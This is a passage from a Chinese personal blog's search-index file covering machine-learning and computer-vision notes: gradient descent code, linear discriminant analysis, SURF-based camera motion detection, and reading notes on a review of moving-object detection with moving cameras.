class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    gradient = gradient_function(theta, X, Y)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> all(abs(gradient) &lt;= <span class="number">1e-5</span>):</span><br><span class="line">        theta = theta - alpha * gradient</span><br><span class="line">        gradient = gradient_function(theta, X, Y)</span><br><span class="line">    <span class="comment">#当梯度小于1e-5时，说明已经进入了比较平滑的状态，类似于山谷的状态,</span></span><br><span class="line">    <span class="comment">#这时候再继续迭代效果也不大了，所以这个时候可以退出循环</span></span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"></span><br><span class="line">optimal = gradient_descent(X, Y, alpha)</span><br><span class="line">print(<span class="string">'optimal:'</span>, optimal)</span><br><span class="line">print(<span class="string">'cost function:'</span>, cost_function(optimal, X, Y)[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据数据画出对应的图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot</span><span class="params">(X, Y, theta)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">    ax = plt.subplot(<span class="number">111</span>)  <span class="comment">#</span></span><br><span class="line">    ax.scatter(X, Y, s=<span class="number">30</span>, c=<span class="string">"red"</span>, marker=<span class="string">"s"</span>)</span><br><span class="line">    plt.xlabel(<span class="string">"X"</span>)</span><br><span class="line">    plt.ylabel(<span class="string">"Y"</span>)</span><br><span class="line">    x = arange(<span class="number">0</span>, <span class="number">21</span>, <span class="number">0.2</span>)  <span class="comment"># x的范围</span></span><br><span class="line">    y = theta[<span class="number">0</span>] + theta[<span class="number">1</span>]*x</span><br><span class="line">    ax.plot(x, y)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">plot(X1, Y, optimal)</span><br></pre></td></tr></table></figure>

<p>下面是上面代码的数学推导</p>
<img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/二次代价函数推导.jpg" style="zoom:20%;">

<p>注：常用库：<br>numpy , scipy , pandas , matplotlib , sklearn</p>
<h3 id="线性判别分析"><a href="#线性判别分析" class="headerlink" title="线性判别分析"></a>线性判别分析</h3><p>线性判别分析(Linear Discriminant Analysis，简称LDA)，其思想：给定训练样例集设法将样例投影到一条直线上，使得同类样例的投影点尽可能接近、异类样例的投影点尽可能远离；在对新样本进行分类时，将其投影到同样的这条直线上，再根据投影点的位置来确定新样本的类别。</p>
<img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/线性判别分析二维示意图.png" style="zoom:100%;">

<p>LDA 的二维示意图：”+”、” “分别代表正例和反例，椭圆表示数据簇的外轮廓，虚线表示投影， 红色实心园和实心三角形分别表示两类样本投影后的中心点.</p>
<p>欲使同类样例的投影点尽可能接近，可以让同类样例投影点的协方差尽可能小;而欲使异类样例的投影点尽可能远离，可以让类中心之间的距离尽可能大。</p>
<p>另J=类中心之间的距离/同类样例投影点的协方差，另J最大化。利用拉格朗日乘子法、奇异值分解等操作，最终即可求解。</p>
<p>推广至N维空间的情况，若将样本投影到N-1维空间，则可以进行降维，且投影过程中使用了类别信息，因此LDA也常被视为一种经典的监督降维技术。</p>
<h4 id="拉格朗日乘数法"><a href="#拉格朗日乘数法" class="headerlink" title="拉格朗日乘数法"></a>拉格朗日乘数法</h4><img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/拉格朗日乘数法1.png" style="zoom:70%;">

<p>假设有自变量x和y，给定约束条件g(x,y)=c，要求f(x,y)在约束g下的极值。可以画出f的等高线图，如上图。此时，约束g=c由于只有一个自由度，因此也是图中的一条曲线（红色曲线所示）。当约束曲线g=c与某一条等高线f=d1相切时，函数f取得极值。两曲线相切等价于两曲线在切点处拥有共线的法向量。因此可得函数f(x,y)与g(x,y)在切点处的梯度（gradient）成正比。</p>
<p>因为两条曲线相切，意味着他们在这点的法线平行，也就是法向量只差一个任意的常数乘子。 </p>
<p>于是我们便可以列出方程组求解切点的坐标(x,y)，进而得到函数f的极值。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>相机运动方向检测1</title>
    <url>/2020/02/08/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B1/</url>
    <content><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>代码实现相机运动方向的检测，用于后面的相机运动补偿。<br>目前还未完成，本篇仅为今日的小结</p>
<h2 id="算法大致思路"><a href="#算法大致思路" class="headerlink" title="算法大致思路"></a>算法大致思路</h2><p>该算法思路仅为当前思路，后续还会继续改进</p>
<p>对于每一帧：<br>1、提取其Surf特征点<br>2、与上一帧的特征点进行匹配，这里可以使用FlannBased与BruteForceMatcher，FlannBased更快而BruteForceMatcher更精确；考虑到视频处理的实时性，本人目前使用FlannBased<br>3、基于距离筛除一些不太可能的匹配，此步骤的前提是场景不会发生形变<br>4、根据已经匹配的特征点及其移动距离与方向，从而获取当前相机在此参考系下的移动情况</p>
<h3 id="主要使用到数据结构与对象"><a href="#主要使用到数据结构与对象" class="headerlink" title="主要使用到数据结构与对象"></a>主要使用到数据结构与对象</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cv::Ptr&lt;SurfFeatureDetector&gt; detector;<span class="comment">//检测器</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;cv::KeyPoint&gt; key_points_1, key_points_2;<span class="comment">//提取的特征点序列</span></span><br><span class="line">cv::Mat descriptors1, descriptors2;<span class="comment">//特征描述子</span></span><br><span class="line">cv::Ptr&lt;cv::DescriptorMatcher&gt; matcher = </span><br><span class="line">    cv::DescriptorMatcher::create(<span class="string">"FlannBased"</span>);<span class="comment">//FlannBased匹配</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;cv::DMatch&gt; dmatches;<span class="comment">//匹配序列</span></span><br></pre></td></tr></table></figure>

<h3 id="目前进度"><a href="#目前进度" class="headerlink" title="目前进度"></a>目前进度</h3><img src="/2020/02/08/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B1/match1.png" style="zoom:125%;">

<a id="more"></a>

<p>2020-02-08:</p>
<img src="/2020/02/08/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B1/result.gif" style="zoom:125%;">

<p>2020-02-10:</p>
<p>优化了筛除误匹配算法的部分，更加减少了误匹配的情况：</p>
<img src="/2020/02/08/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B1/result2.gif" style="zoom:125%;">

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>运动相机下的运动目标跟踪3</title>
    <url>/2020/02/07/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA3/</url>
    <content><![CDATA[<p>继上篇，以下为2月7日研究《Moving Objects Detection with a Moving Camera: A Comprehensive Review》的运动分割法部分的笔记</p>
<h3 id="Motion-segmentation-运动分割法2"><a href="#Motion-segmentation-运动分割法2" class="headerlink" title="Motion segmentation 运动分割法2"></a>Motion segmentation 运动分割法2</h3><p>《Background subtraction for moving cameras based on trajectory-controlled segmentation and label inference》(2015)提出了一个基于轨迹的分水岭分割算法。在应用一个双边的滤波器去柔化图像并增强edges后，无关梯度会被最小化，并且将轨迹点选为标签。这些标签将会用于watershed algorithm (分水岭算法,根据分水岭的构成来考虑图像的分割) 的seeds从而获得分割结果。在这个结果中，会根据轨迹的标签，将分割结果的相应标为前景与背景。最后，利用马尔可夫随机场算法(Markov Random Field，MRF)，让其中的能量函数最小化，使得用前景背景信息推断没有标签的部分的标签。</p>
<img src="/2020/02/07/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA3/P1_2015.png" style="zoom:75%;">

<p>上图中，红色点代表为检测出的背景部分，蓝色点代表检测出的前景部分；其中有一些由于噪点而误检测的特征点可以使用PCA算法筛除</p>
<p>《A multilayer-based framework for online back-ground subtraction with freely moving cameras》(2017)提出了Multi-Layer Background Subtraction(多层的背景差法)。他们使用了多标签的分割，而非二值标签的分割。每一个动作集群点都会被联系到一层中。在每一层中，像素的动作都会由Gaussian Belief Propagation (GaBP)(高斯置信度传播算法)评估。之后，由外观模型、先前的概率图、motion estimation(动作评估)去计算之后的概率图。多标签的分割是正是基于由MRF算法中最小化能量函数得出的概率图计算的。</p>
<img src="/2020/02/07/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA3/P2_2017.png" style="zoom:75%;">

<a id="more"></a>


<p>《Online background subtraction with freely moving cameras using different motion boundaries》(2018)基于光度和光流方向场，使用Canny detector来计算动作的边界 。他们还利用了对下一帧的前景位置预测，从而防止了不可靠的光度与方向的前景流场(foreground flow field)。</p>
<p>《Moving object segmentation using depth and optical flow in car driving sequences》(2016)使用了三种不同的聚类方法来分割三维的动作情况，从而获得前景背景的二值掩码。这三种方法是：simple k-means clustering（k-means聚类算法),spectral clustering(谱聚类算法) with a 4-connected graph,spectral clustering with fully connected graph。<br>k-means clustering:基于欧式距离来划分不同的类<br>spectral clustering: 将带权无向图划分为两个或两个以上的最优子图，使子图内部尽量相似，而子图间距离尽量距离较远 </p>
<p>《An efficient optical flow based motion detection method for non-stationary scenes》(2019)提出了一种双判断的机制来区分前景物体与背景。前景是由前景与背景之间的阈值差别+FlowNet2.0一起共同判断出来的。</p>
<h2 id="论文来源"><a href="#论文来源" class="headerlink" title="论文来源"></a>论文来源</h2><p>论文来源：《Moving Objects Detection with a Moving Camera: A Comprehensive Review》<br>Marie-Neige Chapela, Thierry Bouwmansb<br>aLab. L3I, LRUniv., Avenue Albert Einstein, 17000 La Rochelle, France<br>bLab. MIA, LRUniv., Avenue Albert Einstein, 17000 La Rochelle, France<br>[cs.CV] 15 Jan 2020</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>运动相机下的运动目标跟踪2</title>
    <url>/2020/02/05/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA2/</url>
    <content><![CDATA[<p>以下为阅读《Moving Objects Detection with a Moving Camera: A Comprehensive Review》随读笔记</p>
<h3 id="Motion-segmentation-运动分割法"><a href="#Motion-segmentation-运动分割法" class="headerlink" title="Motion segmentation 运动分割法"></a>Motion segmentation 运动分割法</h3><p>运动分割法的大体思路为利用特征点的轨迹来分割每一帧，分成静态背景与移动物体。</p>
<img src="/2020/02/05/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA2/运动分割法example.png" style="zoom:125%;">

<p>《Background subtraction for moving cameras based on trajectory-controlled segmentation and label inference》(oct 2015)提出：根据特征点的轨迹相似度，并利用PCA算法(主成分分析算法)筛除false trajectories，从而获取几类集群特征点。</p>
<p>《a probabilistic model for causal motion segmentation in moving camera videos》(2016)使用了稠密光流差、旋转流差，从而获得了物体的移动流。然后由平移流(translational flow)估计角度场，并根据每个平移流的平移大小作为该平移角度的可靠性指标，然后由符合条件的流动角度的可能性评估每个像素的流动方向。最后，用贝叶斯公式(Bayes’ rule)获得每个像素的次可能移动，然后会被用于最后的分割当中。作者还提出了，利用一个修正的RANSAC算法选择3个超像素，然后用于去分割视频的第一帧，从而用于后续的估计背景的移动以抵消相机的晃动。</p>
<a id="more"></a>

<p>《Moving object segmentation using depth and optical flow in car driving sequences》(2016)通过使用动作消失点从2D视角动作中获取3D动作，并得出背景的深度。</p>
<p>《A multilayer-based framework for online back-ground subtraction with freely moving cameras》(2017)提出了第一集群轨迹，它动态地基于集群对各个轨迹的标签的异同。通过计算集群内的变化点，各个集群可以分别对应各个前景物体。</p>
<p>《Online background subtraction with freely moving cameras using different motion boundaries》(2018)的作者提出基于光度和光流方向场，利用Canny detector来计算动作的边界，从而获取初始 seeds 。其中，前景seeds是动作边缘上的点，而背景seeds是前景的动作检测方框上的点。</p>
<p>《An efficient optical flow based motion detection method for non-stationary scenes》(2019)基于FlowNet2.0得到稠密光流图。背景的光流是由Constrained RANSAC Algorithm(CRA)的二次变换函数计算出的。CRA是一种改进版本的RANSAC算法，它避免了过拟合并且改进了搜索效率。</p>
<p>《Flownet2.0: Evolution of optical flow estimation with deep networks》(2017)：FlowNet2.0是一种基于深度学习的光流预估算法。</p>
<h2 id="论文来源"><a href="#论文来源" class="headerlink" title="论文来源"></a>论文来源</h2><p>论文来源：《Moving Objects Detection with a Moving Camera: A Comprehensive Review》<br>Marie-Neige Chapela, Thierry Bouwmansb<br>aLab. L3I, LRUniv., Avenue Albert Einstein, 17000 La Rochelle, France<br>bLab. MIA, LRUniv., Avenue Albert Einstein, 17000 La Rochelle, France<br>[cs.CV] 15 Jan 2020</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>运动相机下的运动目标跟踪1</title>
    <url>/2020/02/03/%E8%BF%90%E5%8A%A8%E7%9B%B8%E6%9C%BA%E4%B8%8B%E7%9A%84%E8%BF%90%E5%8A%A8%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA1/</url>
    <content><![CDATA[<h1 id="Moving-Objects-Detection-and-Tracking-with-a-Moving-Camera"><a href="#Moving-Objects-Detection-and-Tracking-with-a-Moving-Camera" class="headerlink" title="Moving Objects Detection and Tracking with a Moving Camera"></a>Moving Objects Detection and Tracking with a Moving Camera</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在本块内容中，将针对移动相机的移动目标检测跟踪进行研究与实现。</p>
<h2 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h2><p>由学者Marie-Neige Chapela, Thierry Bouwmansb发表，在 15 Jan 2020 被收录的论文《Moving Objects Detection with a Moving Camera: A Comprehensive Review》中，将运动相机的运动目标检测方法大致分为两类：一类称为one Plane类，将背景视为flat scenes来处理；第二类将背景作为several parts来处理。</p>
<h3 id="one-Plane作为单平面处理类"><a href="#one-Plane作为单平面处理类" class="headerlink" title="one Plane作为单平面处理类"></a>one Plane作为单平面处理类</h3><h4 id="Panoramic-background-subtraction-全背景减法"><a href="#Panoramic-background-subtraction-全背景减法" class="headerlink" title="Panoramic background subtraction 全背景减法"></a>Panoramic background subtraction 全背景减法</h4><p>一个移动的照相机捕捉到的图像可以被缝在一起形成一个较大的图像，即所谓的全景图或镶嵌图，从而可以再次作为一个静态相机处理。</p>
<h4 id="多相机法"><a href="#多相机法" class="headerlink" title="多相机法"></a>多相机法</h4><p>一些方法使用双摄像头系统，而不是构建全景图，两个摄像机使得具有广泛的视角来观察整体现场。</p>
<h4 id="Motion-compensation-运动补偿法"><a href="#Motion-compensation-运动补偿法" class="headerlink" title="Motion compensation 运动补偿法"></a>Motion compensation 运动补偿法</h4><p>补偿相机的运动，使得能使用应对静态相机的方法</p>
<h4 id="Subspace-segmentation-子空间分割法"><a href="#Subspace-segmentation-子空间分割法" class="headerlink" title="Subspace segmentation 子空间分割法"></a>Subspace segmentation 子空间分割法</h4><p>利用特征点的轨迹用来分离背景和前景。</p>
<h4 id="Motion-segmentation-运动分割法"><a href="#Motion-segmentation-运动分割法" class="headerlink" title="Motion segmentation 运动分割法"></a>Motion segmentation 运动分割法</h4><p>与子空间分割法类似，利用特征点的轨迹，将视频的每一帧分割成静态的背景或移动的物体，但不使用子空间</p>
<h3 id="several-parts方法类"><a href="#several-parts方法类" class="headerlink" title="several parts方法类"></a>several parts方法类</h3><h4 id="平面处理-视差处理"><a href="#平面处理-视差处理" class="headerlink" title="平面处理+视差处理"></a>平面处理+视差处理</h4><p>平面+视差分解法，是以场景为中心的方法；对主要的平面进行运动补偿</p>
<h4 id="Multi-planes-scene-representation-多平面的场景表示"><a href="#Multi-planes-scene-representation-多平面的场景表示" class="headerlink" title="Multi planes scene representation 多平面的场景表示"></a>Multi planes scene representation 多平面的场景表示</h4><p>利用RANSAC级联器算法区分各个平面后处理</p>
<h4 id="网格分割图像法"><a href="#网格分割图像法" class="headerlink" title="网格分割图像法"></a>网格分割图像法</h4><p>利用网格分割图像后进行处理</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog in here</title>
    <url>/2020/01/01/FirstBlog/</url>
    <content><![CDATA[<p>欢迎来到吴泽鑫的博客！</p>
<h2 id="About-me"><a href="#About-me" class="headerlink" title="About me"></a>About me</h2><h3 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h3><h4 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h4><p> <a href="https://github.com/TheXeme" target="_blank" rel="noopener">https://github.com/TheXeme</a></p>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><h4 id="GithubBlog"><a href="#GithubBlog" class="headerlink" title="GithubBlog"></a>GithubBlog</h4><p> <a href="https://thexeme.github.io/">https://thexeme.github.io/</a></p>
<h4 id="GiteeBlog"><a href="#GiteeBlog" class="headerlink" title="GiteeBlog"></a>GiteeBlog</h4><p><a href="https://thexeme.gitee.io/" target="_blank" rel="noopener">https://thexeme.gitee.io/</a></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
</search>
